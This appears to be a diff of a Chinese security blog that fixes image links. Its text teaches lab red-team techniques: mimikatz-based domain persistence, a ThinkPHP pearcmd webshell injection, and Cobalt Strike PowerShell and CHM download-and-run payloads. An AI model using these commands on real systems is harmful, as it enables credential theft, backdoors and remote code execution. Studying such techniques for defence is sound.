 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021629540.png" alt="image-20231002162900337"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629540.png" alt="image-20231002162900337"></p>
 <p>也可以使用psexec，wmi等方法通过Windows7对DC进行远程执行命令了，具体操作不再演示。</p>
 <h3 id="白银票据（Silver-ticket）"><a href="#白银票据（Silver-ticket）" class="headerlink" title="白银票据（Silver ticket）"></a>白银票据（Silver ticket）</h3><p>白银票据不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。</p>
 <p><strong>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值，因此更加隐蔽。</strong></p>
@@ -1283,11 +1283,11 @@
 </ul>
 <p>如下，我们已经获得了普通域用户主机Windows7和域控制器DC的控制权，将使用白银票据伪造CIFS服务权限，对DC进行持久化控制。CIFS服务通常用于Windows主机之间的文件共享。</p>
 <p>测试环境与黄金票据的相同：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021629777.png" alt="image-20231002162915711"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629777.png" alt="image-20231002162915711"></p>
 <p>首先，登录域控，抓取机器账号的Hash：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021629447.png" alt="image-20231002162927301"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629447.png" alt="image-20231002162927301"></p>
 <p>得到域控制器上的计算机账号的Hash为：f0954d00b21d338aa86051eca90f7f74</p>
 <p>（注意是WIN-ENS2VR5TR3N$用户的NTLM-Hash，不是Administrator用户，因为要利用共享服务账号）</p>
 <p>然后切换到普通域用户机器Windows 7中，使用mimikatz生成伪造的白银票据：</p>
@@ -1300,21 +1300,21 @@
 <li>&#x2F;user：要伪造的用户名，任意填写</li>
 <li>&#x2F;target：域控制器名，即FQDN（全称，如dc.domain.com）</li>
 </ul>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021629574.png" alt="image-20231002162943354"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629574.png" alt="image-20231002162943354"></p>
 <p>成功生成了伪造的白银票据，此时进行权限验证。如下，发现已经可以访问域控制器的共享目录了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N.demo.com\c$         // 机器名要全称，注意是全称</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021630411.png" alt="image-20231002163048215"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021630411.png" alt="image-20231002163048215"></p>
 <h3 id="Skeleton-Key（万能钥匙）"><a href="#Skeleton-Key（万能钥匙）" class="headerlink" title="Skeleton Key（万能钥匙）"></a>Skeleton Key（万能钥匙）</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用，其原理就是对 lsass.exe 进行注入，所以重启后会失效。</p>
 <p>我们可以使用Skeleton Key(万能密码)，对域内权限进行持久化操作。我们将Skeleton Key安装在域控制器上，便能够能够让所有域用户使用同一个万能密码对域控进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限，这里需要注意的是重启将失效。具体操作如下。</p>
 <p>控制域控制器后，在域控上传mimikatz，并以管理员权限运行，使用mimikatz注入Skeleton Key：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021631949.png" alt="image-20231002163109791"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021631949.png" alt="image-20231002163109791"></p>
 <p>如上图所示注入成功，此时便会在域内的所有账号中添加万能密码：“mimikatz”，接下来，我们就可以在域内用任何用户，以密码 “mimikatz” 进行登陆了。如下，我们开启域控的远程桌面，并用密码 “mimikatz” 进行登陆：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021632404.png" alt="image-20231002163214300"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021632404.png" alt="image-20231002163214300"></p>
 <p>如下图，登录成功：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021632636.png" alt="image-20231002163229515"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021632636.png" alt="image-20231002163229515"></p>
 <p><strong>注意：</strong>微软在2014年3月12日添加了LSA保护策略，用来防止对进程lsass.exe的代码注入，这样一来就无法使用mimikatz对lsass.exe进行注入，相关操作也会失败。所以，我们要绕过LSA Protection，幸运的是，mimikatz早在2013年10月就已支持绕过LSA Protection，但是该功能需要mimidrv.sys文件，导入驱动文件mimidrv.sys后，绕过LSA Protection，即可操作成功。相应的skeleton key安装命令也变为了如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # !+</span><br><span class="line">mimikatz # !processprotect /process:lsass.exe /remove</span><br><span class="line">mimikatz # misc::skeleton</span><br></pre></td></tr></table></figure>
 
@@ -1332,11 +1332,11 @@
 <p>在域控制器的cmd中进入ntdsutil，然后输入下面命令进行修改DSRM账户的密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil    // 进入ntdsutil</span><br><span class="line">set dsrm password    // 设置DSRM账户的密码</span><br><span class="line">reset password on server null    // 在当前域控制器上恢复DSRM密码</span><br><span class="line">&lt;password&gt;    // 输入新密码</span><br><span class="line">&lt;password&gt;    // 重新输入新密码</span><br><span class="line">q    //退出DSRM密码设置模式</span><br><span class="line">q    // 退出ntdsutil</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021633920.png" alt="image-20231002163312856"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021633920.png" alt="image-20231002163312856"></p>
 <p>2.接着，我们使用mimikatz来读取本地SAM文件中的本地管理员的NTLM Hash，确认域控制器上DSRM账户的密码是否修改成功：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021633406.png" alt="image-20231002163327316"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021633406.png" alt="image-20231002163327316"></p>
 <p>如上图所示，本地管理员administrator的NTLM Hash为：d8f69f9520b448174136e49a1051ef07。</p>
 <p>3.然后，我们修改目标主机DC的DSRM账户登录方式</p>
 <p>在Windows Server 2000以后的版本操作系统中，对DSRM使用控制台登录域控制器进行了限制。我们可以在注册表的HKLM:\System\CurrentControlSet\Control\Lsa\中新建DsrmAdminLogonBehavior项进行设置，将该新建的项中的值设为0、1、2可以分别设置不同的DSRM账户登录方式：</p>
@@ -1348,18 +1348,18 @@
 <p>如下所示，我们用命令将DSRM的登录方式设置为“2”，即在任何情况下，都可以使用DSRM管理员账号登录域控制器：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -name &quot;DsrmAdminLogonBehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021634460.png" alt="image-20231002163407401"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021634460.png" alt="image-20231002163407401"></p>
 <p>4.最后，我们即可以在域成员主机Windows7上通过mimikatz，使用域控制器的本地Administrator账号哈希传递攻击域控了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /domain:OWA /user:Administrator /ntlm:d8f69f9520b448174136e49a1051ef07</span><br></pre></td></tr></table></figure>
 
 <p><strong>注意，在这里，&#x2F;domain选项不是添域名，而是域控制器的机器名（OWA），一定要注意。</strong></p>
 <p>如下图所示，命令执行完后，会在Windows7上自动打开一个新的cmd窗口，在该窗口中我们不用提供明文密码便可以对域控制器进行远程访问或控制了。如下，我们列出了域控制器的c盘目录：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021634947.png" alt="image-20231002163419870"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021634947.png" alt="image-20231002163419870"></p>
 <p>除了向上面那样直接修改DSRM账户的密码外，我们还可以为DSRM同步为一个普通域用户的密码。但是要注意，如果域控制器的系统版本为Windows Server 2008，则需要安装 KB961320 补丁才可以使用指定域账号的密码对DSRM的密码进行同步。在Windows Server 2008以后版本的系统中不需要安装此补丁。</p>
 <p>同步的方式如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil // 进入n</span><br><span class="line">tdsutil set dsrm password // 设置DSRM账户的密码</span><br><span class="line">sync from domain account domainusername  // 使DSRM的密码和指定的domainusername域用户的密码同步</span><br><span class="line">q //退出DSRM密码设置模式    </span><br><span class="line">q // 退出ntdsutil</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021635361.png" alt="image-20231002163521309"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021635361.png" alt="image-20231002163521309"></p>
 <p>之后的操作就和上面所演示的一样了，同样还是读取本地SAM文件中的本地管理员的NTLM Hash，确认域控制器上DSRM账户的密码是否修改成功，然后同样还是修改目标主机DC的DSRM账户登录方式，最后同样还是在域成员主机Windows7上通过mimikatz，使用域控制器的本地Administrator账号哈希传递攻击域控。</p>
 <h3 id="利用-SSP-注入维持权限"><a href="#利用-SSP-注入维持权限" class="headerlink" title="利用 SSP 注入维持权限"></a>利用 SSP 注入维持权限</h3><p>SSP(Security Support Provider)是Windows操作系统<strong>安全机制的提供者</strong>。简单的说，<strong>SSP就是一个DLL文件</strong>，主要用来实现Windows操作系统的<strong>身份认证功能</strong>，例如：NTLM、Kerberos、Negotiate、Secure Channel(Schannel)，Digest、Credential(CredSSP)等等。</p>
 <p>SSPI(Security Support Provider Interface)安全支持提供接口，是Windows操作系统在执行认证操作时使用的API接口。也就是说，SSPI是SSP的API接口。</p>
@@ -1369,7 +1369,7 @@
 <p>在域控中上传mimikatz并以管理员权限运行，输入以下命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021635995.png" alt="image-20231002163535764"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021635995.png" alt="image-20231002163535764"></p>
 <p>如上图所示，我们成功使用Mimikatz将伪造的SSP注入内存，只要用户在目标主机DC上重新登录（这里指的是注销、锁屏等重新登录，重启不行），登录的用户名和密码将会被记录在C:\Windows\System32\mimilsa.log 文件中。</p>
 <p>给出一个Windows锁屏的powershell脚本：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation &#123;</span><br><span class="line"></span><br><span class="line">$signature = @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line"></span><br><span class="line">$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line"></span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure>
@@ -1377,17 +1377,17 @@
 <p>将该脚本上传到目标主机后，用powershell运行他即可使目标主机锁屏：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell .\Lock-screen.ps1</span><br><span class="line">powershell 目录\Lock-screen.ps1</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021636217.png" alt="image-20231002163617105"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021636217.png" alt="image-20231002163617105"></p>
 <p>此时，如果管理员发现屏幕被锁了并重新登录，他的密码就会被记录在 C:\Windows\System32\mimilsa.log 文件中：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021636927.png" alt="image-20231002163630842"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021637915.png" alt="image-20231002163705789"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021636927.png" alt="image-20231002163630842"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637915.png" alt="image-20231002163705789"></p>
 <p>注意：该方法不会再目标主机中留下二进制文件，但是如果域控重启，被注入的内存的伪造的SSP将会丢失。</p>
 <h4 id="方法二：直接上传Mimikatz的mimilib-dll"><a href="#方法二：直接上传Mimikatz的mimilib-dll" class="headerlink" title="方法二：直接上传Mimikatz的mimilib.dll"></a>方法二：直接上传Mimikatz的mimilib.dll</h4><p>该方法是直接将mimikatz中的mimilib.dll放到系统的C:\Windows\System32目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果，但是会在目标主机上留下二进制文件。</p>
 <p>首先，我们上传mimilib.dll到目标域控主机的C:\Windows\System32目录下：</p>
 <p>然后修改注册表 HKEY_LOCAL_MACHINE&#x2F;System&#x2F;CurrentControlSet&#x2F;Control&#x2F;Lsa 的 Security Packages 项，将mimilib.dll添加进去，让其加载新的DLL文件“mimilib.dll”：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021637453.png" alt="image-20231002163741375"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637453.png" alt="image-20231002163741375"></p>
 <p>这样如果是系统重启后，DLL将会被成功加载，用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log中：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021637921.png" alt="image-20231002163750809"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637921.png" alt="image-20231002163750809"></p>
 <h3 id="SID-History域后门"><a href="#SID-History域后门" class="headerlink" title="SID History域后门"></a>SID History域后门</h3><p><strong>SID</strong>也就是安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。安全标识符也被称为安全 ID 或 SID。</p>
 <p>在Windows中，每个用户都有自己的SID。SID的作用主要是<strong>跟踪安全主体控制用户连接资源时的访问权限</strong>。</p>
 <p><strong>SID History</strong>是在域迁移过程中需要使用的一个属性。</p>
@@ -1396,16 +1396,16 @@
 <p>首先我们在域控制器上新建一个恶意用户“whoami”：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user whoami Liufupeng123 /add</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021638962.png" alt="image-20231002163835861"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021638962.png" alt="image-20231002163835861"></p>
 <p>然后再域控上传mimikatz，并用管理员权限运行。然后执行如下命令，将域管理员Administrator的SID添加到恶意域用户 whoami 的SID History属性中。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:whoami /new:Administrator   //将Administrator的SID添加到whoami的SID History属性中</span><br></pre></td></tr></table></figure>
 
 <p>注意：在使用mimikatz注入SID之前，需要使用 sid::patch 命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性；mimikatz在2.1版本后，将 misc:addsid 模块添加到了 sid:add 模块下。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021638565.png" alt="image-20231002163846391"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021638565.png" alt="image-20231002163846391"></p>
 <p>然后，我们可以用powershell查看一下这个whoami恶意用户的SID History：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021639556.png" alt="image-20231002163903479"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021639556.png" alt="image-20231002163903479"></p>
 <p>如上图所示，whoami用户的SID History和administrator域管理员的sid相同。那么现在，我们的whoami用户便拥有了administrator域管理员的权限，并可以用该用户登录域控主机：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021639328.png" alt="image-20231002163917209"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021639328.png" alt="image-20231002163917209"></p>
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252963.html">https://www.freebuf.com/articles/web/252963.html</a></p>
 
@@ -1825,18 +1825,18 @@
 
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull 7coinsec/thinkphp6013_lang_on</span><br><span class="line"></span><br><span class="line">docker run -it -d -p 3344:80 7coinsec/thinkphp6013_lang_on</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png" alt="image-20231002161728326"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png" alt="image-20231002161728326"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先测试是否存在pearcmd，当返回如下图信息就代表pearcmd存在</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?lang=../../../../../../../../usr/local/lib/php/pearcmd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021617516.png" alt="image-20231002161752479"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617516.png" alt="image-20231002161752479"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?phpinfo();?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021618938.png" alt="image-20231002161808892"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021618938.png" alt="image-20231002161808892"></p>
 <p>文件包含，直接包含上一步写入的文件或者其他方式上传的文件均可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?lang=../../../../../../../../tmp/hello</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021619980.png" alt="image-20231002161916940"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021619980.png" alt="image-20231002161916940"></p>
 <p>写一句话木马</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?+config-create+/&amp;lang=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[a]);?&gt;+/tmp/1.php</span><br></pre></td></tr></table></figure>
 
@@ -1888,7 +1888,7 @@
 <p>需要用到kali，先看一下kali的ip</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">#ipconfig(dos命令)</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021525054.png" alt="image-20231002152501998"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021525054.png" alt="image-20231002152501998"></p>
 <p>ip，255.255.255.0子网掩码，192.168.137.255广播地址</p>
 <h2 id="开启CS"><a href="#开启CS" class="headerlink" title="开启CS"></a>开启CS</h2><p>先切换成root用户</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
@@ -1899,87 +1899,87 @@
 <p>打开teamserver，ip为kali的ip，yb.com是密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.137.128 yb.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021525990.png" alt="image-20231002152520930"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021525990.png" alt="image-20231002152520930"></p>
 <p>然后在win10打开start.bat，用户名随便输（也可以在kali打开start.sh）</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021525315.png" alt="image-20231002152536268"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021525315.png" alt="image-20231002152536268"></p>
 <p>主机就是kali的ip，端口默认，密码就是上面设置的密码</p>
 <p>设置一个监听器</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021525754.png" alt="image-20231002152551686"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021526202.png" alt="image-20231002152608148"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021525754.png" alt="image-20231002152551686"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021526202.png" alt="image-20231002152608148"></p>
 <h2 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h2><p>用 Cobalt Strike 生成命令</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021526929.png" alt="image-20231002152620878"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021526635.png" alt="image-20231002152637590"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021526929.png" alt="image-20231002152620878"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021526635.png" alt="image-20231002152637590"></p>
 <p>得到</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.137.131:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
 
 <p>创建一个快捷方式，内容为上</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021526018.png" alt="image-20231002152648969"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021526018.png" alt="image-20231002152648969"></p>
 <p>将生成的powershell.exe放在靶机上，然后双击打开</p>
 <p>成功获取shell</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021527578.png" alt="image-20231002152703516"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021527578.png" alt="image-20231002152703516"></p>
 <h2 id="CHM帮助文档上线"><a href="#CHM帮助文档上线" class="headerlink" title="CHM帮助文档上线"></a>CHM帮助文档上线</h2><p>新建一个文件夹，名字随意，文件夹里面新建一个 index.html 文件并填入如下代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span><br><span class="line">width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,calc.exe&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec</span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span><br><span class="line">width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX</span><br><span class="line">((new-object net.webclient).downloadstring(&#x27;http://192.168.137.131:80/a&#x27;))&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>EasyCHM 编译生成 CHM</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021527441.png" alt="image-20231002152748388"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021528960.png" alt="image-20231002152833900"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021527441.png" alt="image-20231002152748388"></p>
